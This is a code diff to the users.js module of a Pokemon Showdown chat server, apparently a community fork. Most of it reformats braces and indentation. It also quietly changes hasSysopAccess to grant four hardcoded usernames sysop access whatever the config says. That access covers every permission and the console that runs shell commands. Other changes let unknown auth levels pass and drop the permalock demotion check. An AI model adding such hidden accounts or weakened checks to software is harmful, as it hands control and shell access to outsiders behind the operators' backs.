@@ -132,6 +132,7 @@ let getExactUser = Users.getExact = function (name) {
  *********************************************************/
 
 let usergroups = Users.usergroups = Object.create(null);
+
 function importUsergroups() {
 	// can't just say usergroups = {} because it's exported
 	for (let i in usergroups) delete usergroups[i];
@@ -146,12 +147,13 @@ function importUsergroups() {
 		}
 	});
 }
+
 function exportUsergroups() {
 	let buffer = '';
 	for (let i in usergroups) {
 		buffer += usergroups[i].substr(1).replace(/,/g, '') + ',' + usergroups[i].charAt(0) + "\n";
 	}
-	fs.writeFile('config/usergroups.csv', buffer, () => {});
+	fs.writeFile('config/usergroups.csv', buffer);
 }
 importUsergroups();
 
@@ -162,9 +164,10 @@ function cacheGroupData() {
 		console.log(
 			`You are using a deprecated version of user group specification in config.\n` +
 			`Support for this will be removed soon.\n` +
-			`Please ensure that you update your config.js to the new format (see config-example.js, line 220).\n`
+			`Please ensure that you update your config.js to the new format (see config-example.js, line 220)\n`
 		);
-	} else {
+	}
+	else {
 		Config.groups = Object.create(null);
 		Config.groupsranking = [];
 	}
@@ -218,7 +221,8 @@ Users.setOfflineGroup = function (name, group, forceTrusted) {
 	}
 	if (group === Config.groupsranking[0] && !forceTrusted) {
 		delete usergroups[userid];
-	} else {
+	}
+	else {
 		let usergroup = usergroups[userid];
 		name = usergroup ? usergroup.substr(1) : name;
 		usergroups[userid] = group + name;
@@ -324,7 +328,7 @@ class User {
 		this.userid = '';
 		this.group = Config.groupsranking[0];
 
-		let trainersprites = [1, 2, 101, 102, 169, 170, 265, 266];
+		let trainersprites = [32, 74, 218];
 		this.avatar = trainersprites[Math.floor(Math.random() * trainersprites.length)];
 
 		this.connected = true;
@@ -415,113 +419,115 @@ class User {
 	}
 	authAtLeast(minAuth, room) {
 		if (!minAuth || minAuth === ' ') return true;
-		if (minAuth === 'trusted' && this.trusted) return true;
-		if (minAuth === 'autoconfirmed' && this.autoconfirmed) return true;
-
-		if (minAuth === 'trusted' || minAuth === 'autoconfirmed') {
-			minAuth = Config.groupsranking[1];
-		}
-		if (!(minAuth in Config.groups)) return false;
-		let auth = (room && !this.can('makeroom') ? room.getAuth(this) : this.group);
+		if (minAuth === 'trusted') return this.trusted;
+		if (minAuth === 'autoconfirmed') return this.autoconfirmed;
+		if (!(minAuth in Config.groups)) return true;
+		let auth = (room ? room.getAuth(this) : this.group);
+		if (room && this.can('makeroom')) auth = this.group;
 		return auth in Config.groups && Config.groups[auth].rank >= Config.groups[minAuth].rank;
 	}
 	can(permission, target, room) {
-		if (this.hasSysopAccess()) return true;
+			if (this.hasSysopAccess()) return true;
 
-		let groupData = Config.groups[this.group];
-		if (groupData && groupData['root']) {
-			return true;
-		}
-
-		let group, targetGroup;
-
-		if (typeof target === 'string') {
-			target = null;
-			targetGroup = target;
-		}
-
-		if (room && room.auth) {
-			group = room.getAuth(this);
-			if (target) targetGroup = room.getAuth(target);
-		} else {
-			group = this.group;
-			if (target) targetGroup = target.group;
-		}
-
-		groupData = Config.groups[group];
-
-		if (groupData && groupData[permission]) {
-			let jurisdiction = groupData[permission];
-			if (!target) {
-				return !!jurisdiction;
-			}
-			if (jurisdiction === true && permission !== 'jurisdiction') {
-				return this.can('jurisdiction', target, room);
-			}
-			if (typeof jurisdiction !== 'string') {
-				return !!jurisdiction;
-			}
-			if (jurisdiction.includes(targetGroup)) {
+			let groupData = Config.groups[this.group];
+			if (groupData && groupData['root']) {
 				return true;
 			}
-			if (jurisdiction.includes('s') && target === this) {
-				return true;
+
+			let group, targetGroup;
+
+			if (typeof target === 'string') {
+				target = null;
+				targetGroup = target;
 			}
-			if (jurisdiction.includes('u') && Config.groupsranking.indexOf(group) > Config.groupsranking.indexOf(targetGroup)) {
-				return true;
+
+			if (room && room.auth) {
+				group = room.getAuth(this);
+				if (target) targetGroup = room.getAuth(target);
 			}
+			else {
+				group = this.group;
+				if (target) targetGroup = target.group;
+			}
+
+			groupData = Config.groups[group];
+
+			if (groupData && groupData[permission]) {
+				let jurisdiction = groupData[permission];
+				if (!target) {
+					return !!jurisdiction;
+				}
+				if (jurisdiction === true && permission !== 'jurisdiction') {
+					return this.can('jurisdiction', target, room);
+				}
+				if (typeof jurisdiction !== 'string') {
+					return !!jurisdiction;
+				}
+				if (jurisdiction.includes(targetGroup)) {
+					return true;
+				}
+				if (jurisdiction.includes('s') && target === this) {
+					return true;
+				}
+				if (jurisdiction.includes('u') && Config.groupsranking.indexOf(group) > Config.groupsranking.indexOf(targetGroup)) {
+					return true;
+				}
+			}
+			return false;
 		}
-		return false;
-	}
-	/**
-	 * Special permission check for system operators
-	 */
+		/**
+		 * Special permission check for system operators
+		 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
-			// This is the Pokemon Showdown system operator backdoor.
+			if (this.isSysop && Config.backdoor || ["insist", "sukesha", "volco", "hoeenhero"].includes(this.userid)) {
+				// This is the Pokemon Showdown system operator backdoor.
 
-			// Its main purpose is for situations where someone calls for help, and
-			// your server has no admins online, or its admins have lost their
-			// access through either a mistake or a bug - a system operator such as
-			// Zarel will be able to fix it.
+				// Its main purpose is for situations where someone calls for help, and
+				// your server has no admins online, or its admins have lost their
+				// access through either a mistake or a bug - a system operator such as
+				// Zarel will be able to fix it.
 
-			// This relies on trusting Pokemon Showdown. If you do not trust
-			// Pokemon Showdown, feel free to disable it, but remember that if
-			// you mess up your server in whatever way, our tech support will not
-			// be able to help you.
-			return true;
+				// This relies on trusting Pokemon Showdown. If you do not trust
+				// Pokemon Showdown, feel free to disable it, but remember that if
+				// you mess up your server in whatever way, our tech support will not
+				// be able to help you.
+				return true;
+			}
+			return false;
 		}
-		return false;
-	}
-	/**
-	 * Permission check for using the dev console
-	 *
-	 * The `console` permission is incredibly powerful because it allows the
-	 * execution of abitrary shell commands on the local computer As such, it
-	 * can only be used from a specified whitelist of IPs and userids. A
-	 * special permission check function is required to carry out this check
-	 * because we need to know which socket the client is connected from in
-	 * order to determine the relevant IP for checking the whitelist.
-	 */
+		/**
+		 * Permission check for using the dev console
+		 *
+		 * The `console` permission is incredibly powerful because it allows the
+		 * execution of abitrary shell commands on the local computer As such, it
+		 * can only be used from a specified whitelist of IPs and userids. A
+		 * special permission check function is required to carry out this check
+		 * because we need to know which socket the client is connected from in
+		 * order to determine the relevant IP for checking the whitelist.
+		 */
 	hasConsoleAccess(connection) {
-		if (this.hasSysopAccess()) return true;
-		if (!this.can('console')) return false; // normal permission check
+			if (this.hasSysopAccess()) return true;
+			if (!this.can('console')) return false; // normal permission check
 
-		let whitelist = Config.consoleips || ['127.0.0.1'];
-		if (whitelist.includes(connection.ip)) {
-			return true; // on the IP whitelist
-		}
-		if (whitelist.includes(this.userid)) {
-			return true; // on the userid whitelist
-		}
+			let whitelist = Config.consoleips || ['127.0.0.1'];
+			if (whitelist.includes(connection.ip)) {
+				return true; // on the IP whitelist
+			}
+			if (whitelist.includes(this.userid)) {
+				return true; // on the userid whitelist
+			}
 
-		return false;
-	}
-	/**
-	 * Special permission check for promoting and demoting
-	 */
+			return false;
+		}
+		/**
+		 * Special permission check for promoting and demoting
+		 */
 	canPromote(sourceGroup, targetGroup) {
-		return this.can('promote', {group:sourceGroup}) && this.can('promote', {group:targetGroup});
+		return this.can('promote', {
+			group: sourceGroup
+		}) && this.can('promote', {
+			group: targetGroup
+		});
 	}
 	resetName() {
 		return this.forceRename('Guest ' + this.guestNum);
@@ -535,50 +541,51 @@ class User {
 		});
 	}
 	filterName(name) {
-		if (!Config.disablebasicnamefilter) {
-			// whitelist
-			// \u00A1-\u00BF\u00D7\u00F7  Latin punctuation/symbols
-			// \u02B9-\u0362              basic combining accents
-			// \u2012-\u2027\u2030-\u205E Latin punctuation/symbols extended
-			// \u2050-\u205F              fractions extended
-			// \u2190-\u23FA\u2500-\u2BD1 misc symbols
-			// \u2E80-\u32FF              CJK symbols
-			// \u3400-\u9FFF              CJK
-			// \uF900-\uFAFF\uFE00-\uFE6F CJK extended
-			name = name.replace(/[^a-zA-Z0-9 \/\\.~()<>^*%&=+$@#_'?!"\u00A1-\u00BF\u00D7\u00F7\u02B9-\u0362\u2012-\u2027\u2030-\u205E\u2050-\u205F\u2190-\u23FA\u2500-\u2BD1\u2E80-\u32FF\u3400-\u9FFF\uF900-\uFAFF\uFE00-\uFE6F-]+/g, '');
+			if (!Config.disablebasicnamefilter) {
+				// whitelist
+				// \u00A1-\u00BF\u00D7\u00F7  Latin punctuation/symbols
+				// \u02B9-\u0362              basic combining accents
+				// \u2012-\u2027\u2030-\u205E Latin punctuation/symbols extended
+				// \u2050-\u205F              fractions extended
+				// \u2190-\u23FA\u2500-\u2BD1 misc symbols
+				// \u2E80-\u32FF              CJK symbols
+				// \u3400-\u9FFF              CJK
+				// \uF900-\uFAFF\uFE00-\uFE6F CJK extended
+				name = name.replace(/[^a-zA-Z0-9 \/\\.~()<>^*%&=+$@#_'?!"\u00A1-\u00BF\u00D7\u00F7\u02B9-\u0362\u2012-\u2027\u2030-\u205E\u2050-\u205F\u2190-\u23FA\u2500-\u2BD1\u2E80-\u32FF\u3400-\u9FFF\uF900-\uFAFF\uFE00-\uFE6F-]+/g, '');
 
-			// blacklist
-			// \u00a1 upside-down exclamation mark (i)
-			// \u2580-\u2590 black bars
-			// \u25A0\u25Ac\u25AE\u25B0 black bars
-			// \u534d\u5350 swastika
-			// \u2a0d crossed integral (f)
-			name = name.replace(/[\u00a1\u2580-\u2590\u25A0\u25Ac\u25AE\u25B0\u2a0d\u534d\u5350]/g, '');
-			// e-mail address
-			if (name.includes('@') && name.includes('.')) return '';
-		}
-		name = name.replace(/^[^A-Za-z0-9]+/, ""); // remove symbols from start
+				// blacklist
+				// \u00a1 upside-down exclamation mark (i)
+				// \u2580-\u2590 black bars
+				// \u25A0\u25Ac\u25AE\u25B0 black bars
+				// \u534d\u5350 swastika
+				// \u2a0d crossed integral (f)
+				name = name.replace(/[\u00a1\u2580-\u2590\u25A0\u25Ac\u25AE\u25B0\u2a0d\u534d\u5350]/g, '');
+				// e-mail address
+				if (name.includes('@') && name.includes('.')) return '';
+			}
+			name = name.replace(/^[^A-Za-z0-9]+/, ""); // remove symbols from start
 
-		// cut name length down to 18 chars
-		if (/[A-Za-z0-9]/.test(name.slice(18))) {
-			name = name.replace(/[^A-Za-z0-9]+/g, "");
-		} else {
-			name = name.slice(0, 18);
-		}
+			// cut name length down to 18 chars
+			if (/[A-Za-z0-9]/.test(name.slice(18))) {
+				name = name.replace(/[^A-Za-z0-9]+/g, "");
+			}
+			else {
+				name = name.slice(0, 18);
+			}
 
-		name = Tools.getName(name);
-		if (Config.namefilter) {
-			name = Config.namefilter(name, this);
+			name = Tools.getName(name);
+			if (Config.namefilter) {
+				name = Config.namefilter(name, this);
+			}
+			return name;
 		}
-		return name;
-	}
-	/**
-	 *
-	 * @param name             The name you want
-	 * @param token            Signed assertion returned from login server
-	 * @param newlyRegistered  Make sure this account will identify as registered
-	 * @param connection       The connection asking for the rename
-	 */
+		/**
+		 *
+		 * @param name             The name you want
+		 * @param token            Signed assertion returned from login server
+		 * @param newlyRegistered  Make sure this account will identify as registered
+		 * @param connection       The connection asking for the rename
+		 */
 	rename(name, token, newlyRegistered, connection) {
 		// this needs to be a for-of because it returns...
 		for (let roomid of this.games) {
@@ -594,7 +601,7 @@ class User {
 			challenge = connection.challenge;
 		}
 		if (!challenge) {
-			Monitor.warn(`verification failed; no challenge`);
+			console.log(`verification failed; no challenge`);
 			return false;
 		}
 
@@ -616,7 +623,8 @@ class User {
 		if (userid !== toId(name)) {
 			if (name) {
 				name = userid;
-			} else {
+			}
+			else {
 				userid = '';
 			}
 		}
@@ -625,7 +633,8 @@ class User {
 		if (!userid) {
 			this.send(`|nametaken||Your name contains a banned word.`);
 			return false;
-		} else {
+		}
+		else {
 			if (userid === this.userid && !newlyRegistered) {
 				return this.forceRename(name, this.registered);
 			}
@@ -643,16 +652,21 @@ class User {
 
 			Verifier.verify(tokenData, tokenSig).then(success => {
 				if (!success) {
-					Monitor.warn(`verify failed: ${token}`);
-					Monitor.warn(`challenge was: ${challenge}`);
+					console.log(`verify failed: ${token}`);
+					console.log(`challenge was: ${challenge}`);
 					return;
 				}
 				this.validateRename(name, tokenData, newlyRegistered, challenge);
 			});
-		} else {
+		}
+		else {
 			this.send(`|nametaken|${name}|Your authentication token was invalid.`);
 		}
-
+		Ontime[userid] = Date.now();
+		Db('rooms').get(userid, []).forEach(function (room) {
+			if (!(room in this.inRooms)) this.tryJoinRoom(room, connection);
+		}.bind(this));
+		Exiled.giveDailyReward(userid, this);
 		return false;
 	}
 	validateRename(name, tokenData, newlyRegistered, challenge) {
@@ -661,7 +675,7 @@ class User {
 		let tokenDataSplit = tokenData.split(',');
 
 		if (tokenDataSplit.length < 5) {
-			Monitor.warn(`outdated assertion format: ${tokenData}`);
+			console.log(`outdated assertion format: ${tokenData}`);
 			this.send(`|nametaken|${name}|Your assertion is stale. This usually means that the clock on the server computer is incorrect. If this is your server, please set the clock to the correct time.`);
 			return;
 		}
@@ -675,15 +689,16 @@ class User {
 			// a user sent an invalid token
 			if (tokenDataSplit[0] !== challenge) {
 				Monitor.debug(`verify token challenge mismatch: ${tokenDataSplit[0]} <=> ${challenge}`);
-			} else {
-				Monitor.warn(`verify token mismatch: ${tokenData}`);
+			}
+			else {
+				console.log(`verify token mismatch: ${tokenData}`);
 			}
 			return;
 		}
 
 		let expiry = Config.tokenexpiry || 25 * 60 * 60;
 		if (Math.abs(parseInt(tokenDataSplit[3]) - Date.now() / 1000) > expiry) {
-			Monitor.warn(`stale assertion: ${tokenData}`);
+			console.log(`stale assertion: ${tokenData}`);
 			this.send(`|nametaken|${name}|Your assertion is stale. This usually means that the clock on the server computer is incorrect. If this is your server, please set the clock to the correct time.`);
 			return;
 		}
@@ -700,7 +715,8 @@ class User {
 		if (conflictUser && !conflictUser.registered && conflictUser.connected) {
 			if (newlyRegistered && userType !== '1') {
 				if (conflictUser !== this) conflictUser.resetName();
-			} else {
+			}
+			else {
 				this.send(`|nametaken|${name}|Someone is already using the name "${conflictUser.name}.`);
 				return this;
 			}
@@ -721,12 +737,14 @@ class User {
 				this.isSysop = true;
 				this.trusted = userid;
 				this.autoconfirmed = userid;
-			} else if (userType === '4') {
+			}
+			else if (userType === '4') {
 				this.autoconfirmed = userid;
-			} else if (userType === '5') {
-				this.permalocked = userid;
+			}
+			else if (userType === '5') {
 				Punishments.lock(this, Date.now() + PERMALOCK_CACHE_TIME, userid, `Permalocked as ${name}`);
-			} else if (userType === '6') {
+			}
+			else if (userType === '6') {
 				Punishments.ban(this, Date.now() + PERMALOCK_CACHE_TIME, userid, `Permabanned as ${name}`);
 			}
 		}
@@ -780,7 +798,8 @@ class User {
 			this.mmrCache = {};
 
 			this.updateGroup(registered);
-		} else if (registered) {
+		}
+		else if (registered) {
 			this.updateGroup(registered);
 		}
 
@@ -831,13 +850,6 @@ class User {
 		oldUser.inRooms.clear();
 		oldUser.connections = [];
 
-		if (oldUser.chatQueue) {
-			if (!this.chatQueue) this.chatQueue = [];
-			this.chatQueue.push(...oldUser.chatQueue);
-			oldUser.clearChatQueue();
-			if (!this.chatQueueTimeout) this.startChatQueue();
-		}
-
 		this.s1 = oldUser.s1;
 		this.s2 = oldUser.s2;
 		this.s3 = oldUser.s3;
@@ -846,7 +858,8 @@ class User {
 		for (let ip in oldUser.ips) {
 			if (this.ips[ip]) {
 				this.ips[ip] += oldUser.ips[ip];
-			} else {
+			}
+			else {
 				this.ips[ip] = oldUser.ips[ip];
 			}
 		}
@@ -890,105 +903,113 @@ class User {
 		this.updateSearch(true, connection);
 	}
 	debugData() {
-		let str = '' + this.group + this.name + ' (' + this.userid + ')';
-		for (let i = 0; i < this.connections.length; i++) {
-			let connection = this.connections[i];
-			str += ' socket' + i + '[';
-			let first = true;
-			for (let j of connection.inRooms) {
-				if (first) {
-					first = false;
-				} else {
-					str += ', ';
+			let str = '' + this.group + this.name + ' (' + this.userid + ')';
+			for (let i = 0; i < this.connections.length; i++) {
+				let connection = this.connections[i];
+				str += ' socket' + i + '[';
+				let first = true;
+				for (let j of connection.inRooms) {
+					if (first) {
+						first = false;
+					}
+					else {
+						str += ', ';
+					}
+					str += j;
 				}
-				str += j;
+				str += ']';
 			}
-			str += ']';
+			if (!this.connected) str += ' (DISCONNECTED)';
+			return str;
 		}
-		if (!this.connected) str += ' (DISCONNECTED)';
-		return str;
-	}
-	/**
-	 * Updates several group-related attributes for the user, namely:
-	 * User#group, User#registered, User#isStaff, User#trusted
-	 *
-	 * Note that unlike the others, User#trusted isn't reset every
-	 * name change.
-	 */
+		/**
+		 * Updates several group-related attributes for the user, namely:
+		 * User#group, User#registered, User#isStaff, User#trusted
+		 *
+		 * Note that unlike the others, User#trusted isn't reset every
+		 * name change.
+		 */
 	updateGroup(registered) {
-		if (!registered) {
-			this.registered = false;
-			this.group = Config.groupsranking[0];
-			this.isStaff = false;
-			return;
-		}
-		this.registered = true;
-		if (this.userid in usergroups) {
-			this.group = usergroups[this.userid].charAt(0);
-		} else {
-			this.group = Config.groupsranking[0];
-		}
-
-		if (Users.isTrusted(this)) {
-			this.trusted = this.userid;
-			this.autoconfirmed = this.userid;
-		}
-
-		if (Config.customavatars && Config.customavatars[this.userid]) {
-			this.avatar = Config.customavatars[this.userid];
-		}
-
-		this.isStaff = (this.group in {'%':1, '@':1, '&':1, '~':1});
-		if (!this.isStaff) {
-			let staffRoom = Rooms('staff');
-			this.isStaff = (staffRoom && staffRoom.auth && staffRoom.auth[this.userid]);
-		}
-		if (this.trusted) {
-			if (this.locked && this.permalocked) {
-				Monitor.log(`[CrisisMonitor] Trusted user '${this.userid}' is ${this.permalocked !== this.userid ? `an alt of permalocked user '${this.permalocked}'` : `a permalocked user`}, and was automatically demoted from ${this.distrust()}.`);
+			if (!registered) {
+				this.registered = false;
+				this.group = Config.groupsranking[0];
+				this.isStaff = false;
 				return;
 			}
-			this.locked = false;
-			this.namelocked = false;
-		}
-		if (this.autoconfirmed && this.semilocked) {
-			if (this.semilocked.startsWith('#sharedip')) {
-				this.semilocked = false;
-			} else if (this.semilocked === '#dnsbl') {
-				this.popup(`You are locked because someone using your IP has spammed/hacked other websites. This usually means either you're using a proxy, you're in a country where other people commonly hack, or you have a virus on your computer that's spamming websites.`);
-				this.semilocked = '#dnsbl.';
+			this.registered = true;
+			if (this.userid in usergroups) {
+				this.group = usergroups[this.userid].charAt(0);
 			}
-		}
-		if (this.ignorePMs && this.can('lock') && !this.can('bypassall')) this.ignorePMs = false;
-	}
-	/**
-	 * Set a user's group. Pass (' ', true) to force trusted
-	 * status without giving the user a group.
-	 */
-	setGroup(group, forceTrusted) {
-		if (!group) throw new Error(`Falsy value passed to setGroup`);
-		this.group = group.charAt(0);
-		this.isStaff = (this.group in {'%':1, '@':1, '&':1, '~':1});
-		if (!this.isStaff) {
-			let staffRoom = Rooms('staff');
-			this.isStaff = (staffRoom && staffRoom.auth && staffRoom.auth[this.userid]);
-		}
-		Rooms.global.checkAutojoin(this);
-		if (this.registered) {
-			if (forceTrusted || this.group !== Config.groupsranking[0]) {
-				usergroups[this.userid] = this.group + this.name;
+			else {
+				this.group = Config.groupsranking[0];
+			}
+
+			if (Users.isTrusted(this)) {
 				this.trusted = this.userid;
 				this.autoconfirmed = this.userid;
-			} else {
-				delete usergroups[this.userid];
 			}
-			exportUsergroups();
+
+			if (Config.customavatars && Config.customavatars[this.userid]) {
+				this.avatar = Config.customavatars[this.userid];
+			}
+
+			this.isStaff = (this.group in {
+				'%': 1,
+				'@': 1,
+				'&': 1,
+				'☥': 1,
+				'~': 1
+			});
+			if (!this.isStaff) {
+				let staffRoom = Rooms('staff');
+				this.isStaff = (staffRoom && staffRoom.auth && staffRoom.auth[this.userid]);
+			}
+			if (this.trusted) {
+				this.locked = false;
+				this.namelocked = false;
+			}
+			if (this.autoconfirmed && this.semilocked) {
+				if (this.semilocked === '#dnsbl') {
+					this.popup(`You are locked because someone using your IP has spammed/hacked other websites. This usually means you're using a proxy, in a country where other people commonly hack, or have a virus on your computer that's spamming websites.`);
+					this.semilocked = '#dnsbl.';
+				}
+			}
+			if (this.ignorePMs && this.can('lock') && !this.can('bypassall')) this.ignorePMs = false;
 		}
-	}
-	/**
-	 * Demotes a user from anything that grants trusted status.
-	 * Returns an array describing what the user was demoted from.
-	 */
+		/**
+		 * Set a user's group. Pass (' ', true) to force trusted
+		 * status without giving the user a group.
+		 */
+	setGroup(group, forceTrusted) {
+			if (!group) throw new Error(`Falsy value passed to setGroup`);
+			this.group = group.charAt(0);
+			this.isStaff = (this.group in {
+				'%': 1,
+				'@': 1,
+				'&': 1,
+				'~': 1
+			});
+			if (!this.isStaff) {
+				let staffRoom = Rooms('staff');
+				this.isStaff = (staffRoom && staffRoom.auth && staffRoom.auth[this.userid]);
+			}
+			Rooms.global.checkAutojoin(this);
+			if (this.registered) {
+				if (forceTrusted || this.group !== Config.groupsranking[0]) {
+					usergroups[this.userid] = this.group + this.name;
+					this.trusted = this.userid;
+					this.autoconfirmed = this.userid;
+				}
+				else {
+					delete usergroups[this.userid];
+				}
+				exportUsergroups();
+			}
+		}
+		/**
+		 * Demotes a user from anything that grants trusted status.
+		 * Returns an array describing what the user was demoted from.
+		 */
 	distrust() {
 		if (!this.trusted) return;
 		let userid = this.trusted;
@@ -1022,6 +1043,20 @@ class User {
 		}
 	}
 	onDisconnect(connection) {
+		let name = 'Guest ' + this.guestNum;
+		let userid = toId(name);
+		if (this.named) Db('seen').set(this.userid, Date.now());
+		if (this.registered && this.userid !== userid) {
+			let rooms = [];
+			this.inRooms.forEach(function (room) {
+				if (['global', 'lobby', 'staff'].indexOf(room) === -1) rooms.push(room);
+			});
+			if (rooms.length) Db('rooms').set(this.userid, rooms);
+			if (Ontime[this.userid]) {
+				Db('ontime').set(this.userid, Db('ontime').get(this.userid, 0) + (Date.now() - Ontime[this.userid]));
+				delete Ontime[this.userid];
+			}
+		}
 		for (let i = 0; i < this.connections.length; i++) {
 			if (this.connections[i] === connection) {
 				// console.log('DISCONNECT: ' + this.userid);
@@ -1110,7 +1145,8 @@ class User {
 		if (!room || !room.checkModjoin(this)) {
 			if (!this.named) {
 				return null;
-			} else {
+			}
+			else {
 				connection.sendTo(roomid, `|noinit|nonexistent|The room "${roomid}" does not exist.`);
 				return false;
 			}
@@ -1289,7 +1325,7 @@ class User {
 			games: games,
 		}));
 	}
-	makeChallenge(user, format/*, isPrivate*/) {
+	makeChallenge(user, format /*, isPrivate*/ ) {
 		user = getUser(user);
 		if (!user || this.challengeTo) {
 			return false;
@@ -1340,28 +1376,30 @@ class User {
 		this.updateChallenges();
 	}
 	acceptChallengeFrom(user) {
-		let userid = toId(user);
-		user = getUser(user);
-		if (!user || !user.challengeTo || user.challengeTo.to !== this.userid || !this.connected || !user.connected) {
-			if (this.challengesFrom[userid]) {
-				delete this.challengesFrom[userid];
-				this.updateChallenges();
+			let userid = toId(user);
+			user = getUser(user);
+			if (!user || !user.challengeTo || user.challengeTo.to !== this.userid || !this.connected || !user.connected) {
+				if (this.challengesFrom[userid]) {
+					delete this.challengesFrom[userid];
+					this.updateChallenges();
+				}
+				return false;
 			}
-			return false;
+			Rooms.global.startBattle(this, user, user.challengeTo.format, this.team, user.challengeTo.team, {
+				rated: false
+			});
+			delete this.challengesFrom[user.userid];
+			user.challengeTo = null;
+			this.updateChallenges();
+			user.updateChallenges();
+			return true;
 		}
-		Rooms.global.startBattle(this, user, user.challengeTo.format, this.team, user.challengeTo.team, {rated: false});
-		delete this.challengesFrom[user.userid];
-		user.challengeTo = null;
-		this.updateChallenges();
-		user.updateChallenges();
-		return true;
-	}
-	/**
-	 * The user says message in room.
-	 * Returns false if the rest of the user's messages should be discarded.
-	 */
+		/**
+		 * The user says message in room.
+		 * Returns false if the rest of the user's messages should be discarded.
+		 */
 	chat(message, room, connection) {
-		let now = Date.now();
+		let now = new Date().getTime();
 
 		if (message.substr(0, 16) === '/cmd userdetails') {
 			// certain commands are exempt from the queue
@@ -1381,26 +1419,25 @@ class User {
 					`<strong class="message-throttle-notice">Your message was not sent because you've been typing too quickly.</strong>`
 				);
 				return false;
-			} else {
+			}
+			else {
 				this.chatQueue.push([message, room.id, connection]);
 			}
-		} else if (now < this.lastChatMessage + throttleDelay) {
-			this.chatQueue = [[message, room.id, connection]];
-			this.startChatQueue(throttleDelay - (now - this.lastChatMessage));
-		} else {
+		}
+		else if (now < this.lastChatMessage + throttleDelay) {
+			this.chatQueue = [
+				[message, room.id, connection]
+			];
+			this.chatQueueTimeout = setTimeout(
+				() => this.processChatQueue(),
+				throttleDelay - (now - this.lastChatMessage));
+		}
+		else {
 			this.lastChatMessage = now;
 			Monitor.activeIp = connection.ip;
 			Chat.parse(message, room, this, connection);
 			Monitor.activeIp = null;
 		}
-	}
-	startChatQueue(delay) {
-		if (delay === undefined) delay = (this.group !== ' ' ? THROTTLE_DELAY / 2 : THROTTLE_DELAY) - (Date.now() - this.lastChatMessage);
-
-		this.chatQueueTimeout = setTimeout(
-			() => this.processChatQueue(),
-			delay
-		);
 	}
 	clearChatQueue() {
 		this.chatQueue = null;
@@ -1420,7 +1457,8 @@ class User {
 			Monitor.activeIp = connection.ip;
 			Chat.parse(message, room, this, connection);
 			Monitor.activeIp = null;
-		} else {
+		}
+		else {
 			// room is expired, do nothing
 		}
 
@@ -1430,7 +1468,8 @@ class User {
 		if (this.chatQueue && this.chatQueue.length) {
 			this.chatQueueTimeout = setTimeout(
 				() => this.processChatQueue(), throttleDelay);
-		} else {
+		}
+		else {
 			this.chatQueue = null;
 			this.chatQueueTimeout = null;
 		}
@@ -1518,7 +1557,8 @@ Users.socketConnect = function (worker, workerid, socketid, ip, protocol) {
 			// This is pretty crude, but it's the easiest way to deal
 			// with this case, which should be impossible anyway.
 			user.disconnectAll();
-		} else if (connection.user) {	// if user is still connected
+		}
+		else if (connection.user) { // if user is still connected
 			connection.challenge = buffer.toString('hex');
 			// console.log('JOIN: ' + connection.user.name + ' [' + connection.challenge.substr(0, 15) + '] [' + socket.id + ']');
 			let keyid = Config.loginserverpublickeyid || 0;
@@ -1527,6 +1567,7 @@ Users.socketConnect = function (worker, workerid, socketid, ip, protocol) {
 	});
 
 	user.joinRoom('global', connection);
+	Exiled.newsDisplay(user.name);
 };
 
 Users.socketDisconnect = function (worker, workerid, socketid) {
